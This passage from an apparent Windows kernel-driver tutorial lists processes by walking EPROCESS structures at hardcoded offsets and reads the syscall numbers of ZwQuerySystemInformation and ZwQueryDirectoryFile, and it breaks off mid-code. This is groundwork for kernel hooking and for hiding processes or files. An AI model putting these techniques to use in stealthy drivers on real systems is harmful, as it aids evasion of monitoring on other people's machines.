style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;outputBufferLength=%d&quot;,outputBufferLength);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>*outputBuffer
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while
(1)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>sprintf(aa,&quot;%s:%d\n&quot;,(char
*)proc+508,proc-&gt;pid);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>len
= strlen(aa);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>totallen
= totallen + len;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%s
%d %d&quot;,aa,len,totallen);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strcat(outputBuffer,aa);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>proc
= (struct process *)( (char *)proc-&gt;Flink - 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( startpid == proc-&gt;pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Information=totallen;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Irp-&gt;IoStatus.Status
= STATUS_SUCCESS;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
use the same code that we used earlier to display all the programs running by
traversing the link list in the while loop. We first use the sprintf function
to write out the name of the program and its pid. We are assuming that the name
of the program begins 508 bytes form the start.<span style="mso-spacerun:
yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the next program we will explain how we get this magic number. We then find out
the length of the string in the array aa using the strlen function. We also
need a variable totallen to keep track off the number of bytes we plan to send
across. We then use the function strcat to copy the current string in the array
aa to the outputBuffer. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>At
the start of the while loop we null terminate the array. When we leave the
while loop we set the Information member to totallen, the number of bytes we
have written in the buffer. In future we will display everything in ring 0, as
an exercise you can display it in ring 3.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*p;int i=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gDeviceName,L&quot;\\Device\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RtlInitUnicodeString(&amp;gSymbolicLinkName,L&quot;\\DosDevices\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateDevice
(driverObject,0,&amp;gDeviceName,FILE_DEVICE_UNKNOWN,0,0,&amp;gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCreateSymbolicLink(&amp;gSymbolicLinkName,
&amp;gDeviceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
9 =%x gpDeviceObject=%x&quot;,driverObject,gpDeviceObject);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p=
(char *) PsGetCurrentProcess ();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(i
= 0; i &lt;4096 ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( strncmp(p+i,&quot;System&quot;,6) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;i=%d&quot;,i);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>i=508<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>When
the function DriverEntry gets called, the current process running is not our program
y.exe or any other program. It is the OS or the program System. The function
PsGetCurrentProcess returns a pointer to the EPROCESS structure which we store
in variable p. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
next use a for loop for finding out where a string System or the name of the
current program starts from p. When we find this string, we break out of the
for loop. This value is 508 and therefore all process have the name beginning
from this offset.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P36<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS NTAPI
ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long no;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char first;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>first = *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;first=%x
no=%d p=%x&quot;,first,no,p);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>first = *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;first=%x
no=%d p=%x&quot;,first,no,p);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>first=b8
no=151 p=804011ab<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>first=b8
no=125 p=8040100b<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
have created a function prototype for the function ZwQuerySystemInformation but
have not specified the code for this function anywhere. The NTAPI stands for
_stdcall which does do things. One it changes the name of the function by
adding the @ sign and a number denoting the total space occupied by all the
parameters on the stack. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
was explained earlier and unlike the C calling convention which is followed by
default, in _stdcall the calle i.e. the actual function restores the stack and
not the caller. If we mix up calling conventions, then the stack looses its
sanctity<span style="mso-spacerun: yes">  </span>and anything can happen.
Normally if you are lucky, the machine simply hangs or if you are like us, the
code malfunctions in dumb ways and you wonder what is happening. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the DriverEntry function we set p to the name of the function
ZwQuerySystemInformation. The name of the function is a number that tells you
where the function starts or begins in memory. We then print out the first byte
which is B8 and then the next four. For the ZwQuerySystemInformation this value
is 151. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
then try out the same antics with the function ZwQueryDirectoryFile, we specify
only the prototype and here also the first byte is B8 and the next four are
125. NTSYSAPI is a hash define for __declspec(dllimport). When we create a Dll
and we want others to use our functions or variables we use the keyword
__declspec(dllexport) which tells the linker to create the entities needed so
that others can access our functions or variables. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
when we want to use the variables or functions exported by others we use the
__declspec(dllimport) keyword which is optional. But if you do not specify it,
then the value does not get set and we get the wrong answers. Thus it is
optional only in name. To be specific on our machine when we used the NTSYSAPI
both functions gave us a value starting with 80401. When we removed it, the
variable did not get initialized and gave us a value starting with eb7e. This
is obviously a random value in kernel space. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
we do not use the NTAPI #define, all works well but you are sitting on a time
bomb waiting to explode. This bomb will explode the minute you call a function
and the stack will go haywire and here even god can not help you.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the b.bat file we use a lib file ntoskrnl.lib. This lib file stands in for ntoskrnl.exe
which is present in C:\winnt\system32 and is 1.7 MB large. This lib file has a
large number of exported variables and functions, of which two we have just
used. This is why we get no error as we have not created the code of the
functions, they are exported by the file ntoskrnl.exe. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
function printf is exported by libc.lib or oldnames.lib. Remove the lib file
ntoskrnl.lib from the linker and see the error we get. In the same vein, the
calling convention _stdcall is also a must.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>For
the ones who excel in writing shellcode, one assembler instruction that we use
a lot is to mov a value in the eax register. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
if we want to mov a value 10 in the eax register we would write it as mov eax,
10. If you see the opcode of this instruction, it is b8 10 0 0 0. Thus the
first five bytes of any function beginning with Zw starts with the opcode<span
style="mso-spacerun: yes">  </span>B8. Thus every Zw function starts by moving
a value into the eax register. We have displayed the values used by two Zw
functions, try the others out at your own risk.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P37<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent OPTIONAL,<span
style='mso-tab-count:1'> </span>IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,<span
style='mso-tab-count:1'>           </span>IN PVOID IoApcContext OPTIONAL,<span
style='mso-tab-count:1'>   </span>OUT PIO_STATUS_BLOCK pIoStatusBlock,<span
style='mso-tab-count:1'>           </span>OUT PVOID FileInformationBuffer,<span
style='mso-tab-count:1'>    </span>IN ULONG FileInformationBufferLength,<span
style='mso-tab-count:1'>      </span>IN FILE_INFORMATION_CLASS FileInfoClass,<span
style='mso-tab-count:1'>  </span>IN BOOLEAN bReturnOnlyOneEntry,<span
style='mso-tab-count:1'> </span>IN PUNICODE_STRING PathMask OPTIONAL,<span
style='mso-tab-count:1'>      </span>IN BOOLEAN bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
